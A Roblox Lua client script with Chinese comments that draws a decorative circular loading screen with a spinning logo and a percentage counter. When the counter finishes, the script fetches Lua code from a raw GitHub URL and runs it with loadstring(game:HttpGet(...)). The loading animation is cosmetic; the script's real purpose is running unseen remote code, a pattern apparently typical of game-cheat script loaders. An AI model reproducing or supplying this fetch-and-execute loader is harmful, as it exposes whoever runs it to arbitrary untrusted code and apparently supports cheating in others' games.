-- 获取 PlayerGui
local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- 创建 ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CircleLoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

-- 半透明背景
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BackgroundTransparency = 0.4
bg.Parent = screenGui

-- 圆形框
local circleFrame = Instance.new("Frame")
circleFrame.Size = UDim2.new(0, 150, 0, 150)
circleFrame.Position = UDim2.new(0.5, -75, 0.5, -75)
circleFrame.BackgroundTransparency = 1
circleFrame.Parent = bg

-- 环形 UIStroke
local circleStroke = Instance.new("UIStroke")
circleStroke.Color = Color3.fromRGB(0, 255, 170)
circleStroke.Thickness = 10
circleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
circleStroke.Parent = circleFrame

-- 进度环形遮罩
local progressMask = Instance.new("ImageLabel")
progressMask.Size = UDim2.new(1, 0, 1, 0)
progressMask.Position = UDim2.new(0, 0, 0, 0)
progressMask.BackgroundTransparency = 1
progressMask.Image = "rbxassetid://7072718368" -- 可替换为环形素材（或者自己上传）
progressMask.ImageColor3 = Color3.fromRGB(0, 255, 170)
progressMask.Rotation = 0
progressMask.Parent = circleFrame

-- 中心 LOGO
local logo = Instance.new("ImageLabel")
logo.Size = UDim2.new(0, 60, 0, 60)
logo.Position = UDim2.new(0.5, -30, 0.5, -30)
logo.BackgroundTransparency = 1
logo.Image = "rbxassetid://7072718368" -- 可替换成你的 LOGO
logo.Parent = circleFrame

-- 百分比文字
local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(1, 0, 1, 0)
percentLabel.Position = UDim2.new(0, 0, 0, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextSize = 22
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.Parent = circleFrame

-- 旋转 Logo 动画
task.spawn(function()
	while screenGui.Parent do
		logo.Rotation += 1
		wait(0.01)
	end
end)

-- 平滑环形进度
local duration = 5
local elapsed = 0
local step = 0.02

while elapsed < duration do
	elapsed += step
	local progress = math.clamp(elapsed / duration, 0, 1)
	progressMask.ImageRectSize = Vector2.new(1024 * progress, 1024)
	percentLabel.Text = string.format("%d%%", math.floor(progress * 100))
	wait(step)
end

percentLabel.Text = "100%"

wait(0.5)

-- 执行外部脚本
local success, result = pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/xiao66778/xGB/refs/heads/main/1168.lua"))()
end)

if success then
	print("脚本加载成功！")
else
	warn("脚本加载失败：" .. tostring(result))
end

screenGui:Destroy()
